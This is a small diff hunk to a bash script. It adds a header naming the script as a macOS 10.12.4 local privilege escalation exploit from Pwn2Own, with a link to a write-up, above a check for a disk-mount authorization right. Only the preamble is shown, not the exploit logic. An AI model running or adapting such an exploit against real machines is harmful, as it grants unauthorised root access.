@@ -1,4 +1,7 @@
 #!/bin/bash
+#
+# macOS 10.12.4 local privilege escalation exploit by @_niklasb
+# https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc
 
 if ! security authorize system.volume.internal.mount &>/dev/null; then
   echo 2>&1 "Cannot acquire system.volume.internal.mount right. This will not work."
